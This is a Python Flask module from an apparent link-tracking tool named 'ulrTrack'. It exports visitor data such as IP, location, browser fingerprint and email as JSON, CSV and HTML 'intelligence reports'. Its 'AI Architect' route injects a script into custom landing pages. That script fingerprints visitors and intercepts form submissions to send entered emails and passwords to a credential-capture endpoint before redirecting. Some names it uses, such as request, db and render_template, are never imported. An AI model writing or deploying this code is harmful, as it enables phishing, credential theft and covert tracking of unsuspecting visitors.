from flask import Blueprint, send_file, make_response
from flask_login import login_required
import json
import csv
from io import BytesIO, StringIO
from datetime import datetime

from ...models import Link, Visit
from ...config import Config

bp = Blueprint('dashboard_exports', __name__)

@bp.route('/export/<slug>/json')
@login_required
def export_json(slug):
    """Export link stats as JSON."""
    link = Link.query.filter_by(slug=slug).first_or_404()
    visits = Visit.query.filter_by(link_id=link.id).order_by(Visit.timestamp.desc()).all()
    
    data = {
        'link': {
            'slug': link.slug,
            'destination': link.destination,
            'created_at': link.created_at.isoformat(),
            'total_visits': len(visits)
        },
        'visits': []
    }
    
    for v in visits:
        data['visits'].append({
            'id': v.id,
            'timestamp': v.timestamp.isoformat(),
            'ip_address': v.ip_address,
            'hostname': v.hostname,
            'isp': v.isp,
            'org': v.org,
            'city': v.city,
            'country': v.country,
            'lat': v.lat,
            'lon': v.lon,
            'os_family': v.os_family,
            'device_type': v.device_type,
            'user_agent': v.user_agent,
            'screen_res': v.screen_res,
            'timezone': v.timezone,
            'browser_language': v.browser_language,
            'is_suspicious': v.is_suspicious,
            'email': v.email,
            'canvas_hash': v.canvas_hash,
            'etag': v.etag,
            'webgl_renderer': v.webgl_renderer,
            'ai_summary': v.ai_summary,
            'cpu_cores': v.cpu_cores,
            'ram_gb': v.ram_gb
        })
        
    import json
    response = make_response(json.dumps(data, indent=2))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=stats_{slug}.json'
    return response

# ============================================
# V38: AI ARCHITECT (Custom Landing Pages)
# ============================================

@bp.route('/architect')
@login_required
def architect():
    links = Link.query.order_by(Link.created_at.desc()).all()
    return render_template('architect.html', links=links)

@bp.route('/architect/process', methods=['POST'])
@login_required
def architect_process():
    """Process custom HTML with auto-injection."""
    import re
    from flask import jsonify
    
    link_id = request.form.get('link_id')
    custom_html = request.form.get('custom_html')
    auto_inject = request.form.get('auto_inject') == 'true'
    
    if not link_id or not custom_html:
        return jsonify({'error': 'Missing data'}), 400
    
    link = Link.query.get(link_id)
    if not link:
        return jsonify({'error': 'Link not found'}), 404
    
    detected_fields = []
    processed_html = custom_html
    
    if auto_inject:
        if re.search(r'<input[^>]*type=["\']email["\']', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Email input detected')
        if re.search(r'<input[^>]*type=["\']password["\']', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Password input detected')
        if re.search(r'<form', custom_html, re.IGNORECASE):
            detected_fields.append('✅ Form detected')
        
        injection_script = """
<script>
const VISIT_ID = "{{ visit_id }}";
function getCanvasHash() {
    try {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillText("ulrTrack", 2, 15);
        return canvas.toDataURL().substring(0, 32);
    } catch(e) { return null; }
}
(function() {
    navigator.sendBeacon('/api/beacon', JSON.stringify({
        visit_id: VISIT_ID,
        canvas_hash: getCanvasHash(),
        screen_res: window.screen.width + 'x' + window.screen.height
    }));
})();
window.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const email = form.querySelector('input[type="email"]')?.value;
            const password = form.querySelector('input[type="password"]')?.value;
            fetch('/api/capture_credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({visit_id: VISIT_ID, email: email, password: password})
            }).then(() => window.location.href = "{{ destination }}")
              .catch(() => window.location.href = "{{ destination }}");
        });
    });
});
</script>
"""
        if '</body>' in processed_html:
            processed_html = processed_html.replace('</body>', injection_script + '</body>', 1)
        elif '</html>' in processed_html:
            processed_html = processed_html.replace('</html>', injection_script + '</html>', 1)
        else:
            processed_html += injection_script
    
    return jsonify({'html': processed_html, 'detected_fields': detected_fields})

@bp.route('/architect/save', methods=['POST'])
@login_required
def architect_save():
    link_id = request.form.get('link_id')
    html = request.form.get('html')
    link = Link.query.get(link_id)
    from flask import jsonify
    if link:
        link.custom_html = html
        db.session.commit()
        return jsonify({'success': True})
    return jsonify({'error': 'Link not found'}), 404

@bp.route('/export/<slug>/csv')
@login_required
def export_csv(slug):
    """Export link stats as CSV (Google Sheets compatible)."""
    import csv
    from io import StringIO
    
    link = Link.query.filter_by(slug=slug).first_or_404()
    visits = Visit.query.filter_by(link_id=link.id).order_by(Visit.timestamp.desc()).all()
    
    si = StringIO()
    cw = csv.writer(si)
    
    # Header
    cw.writerow([
        'ID', 'Timestamp', 'IP', 'Hostname', 'ISP', 'Org', 'City', 'Country',
        'Lat', 'Lon', 'OS', 'Device', 'Email', 'Canvas Hash', 'ETag',
        'WebGL', 'AI Summary', 'CPU Cores', 'RAM GB', 'Suspicious', 'Referrer'
    ])
    
    for v in visits:
        cw.writerow([
            v.id, v.timestamp, v.ip_address, v.hostname or '', v.isp or '', v.org or '',
            v.city or '', v.country or '', v.lat or '', v.lon or '',
            v.os_family or '', v.device_type or '', v.email or '',
            v.canvas_hash or '', v.etag or '', v.webgl_renderer or '',
            v.ai_summary or '', v.cpu_cores or '', v.ram_gb or '',
            'Yes' if v.is_suspicious else 'No', v.referrer or ''
        ])
    
    output = make_response(si.getvalue())
    output.headers['Content-Disposition'] = f'attachment; filename={slug}_export.csv'
    output.headers['Content-Type'] = 'text/csv'
    return output

@bp.route('/export/<slug>/pdf')
@login_required
def export_pdf(slug):
    """Export link stats as PDF (HTML-based, print-ready)."""
    link = Link.query.filter_by(slug=slug).first_or_404()
    visits = Visit.query.filter_by(link_id=link.id).order_by(Visit.timestamp.desc()).limit(50).all()
    
    # Generate HTML report
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Report: /{slug}</title>
        <style>
            body {{ font-family: Arial, sans-serif; padding: 20px; }}
            h1 {{ color: #333; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; font-size: 11px; }}
            th {{ background: #333; color: white; }}
            tr:nth-child(even) {{ background: #f9f9f9; }}
            .meta {{ color: #666; margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <h1>Intelligence Report: /{slug}</h1>
        <div class="meta">
            <p>Destination: {link.destination}</p>
            <p>Total Visits: {len(visits)}</p>
            <p>Generated: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M')}</p>
        </div>
        <table>
            <thead>
                <tr>
                    <th>Time</th>
                    <th>IP / Hostname</th>
                    <th>Location</th>
                    <th>Device</th>
                    <th>Identity</th>
                </tr>
            </thead>
            <tbody>
    '''
    
    for v in visits:
        identity = v.email or v.ai_summary or '-'
        html += f'''
            <tr>
                <td>{v.timestamp.strftime('%Y-%m-%d %H:%M')}</td>
                <td>{v.ip_address}<br><small>{v.hostname or v.org or ''}</small></td>
                <td>{v.city or ''}, {v.country or ''}</td>
                <td>{v.os_family or ''} / {v.device_type or ''}</td>
                <td>{identity}</td>
            </tr>
        '''
    
    html += '''
            </tbody>
        </table>
        <p style="margin-top:20px; font-size:10px; color:#999;">
            Generated by ulrTrack Intelligence Platform
        </p>
    </body>
    </html>
    '''
    
    response = make_response(html)
    response.headers['Content-Type'] = 'text/html'
    response.headers['Content-Disposition'] = f'attachment; filename={slug}_report.html'
    return response


# V41: Custom AI Analysis
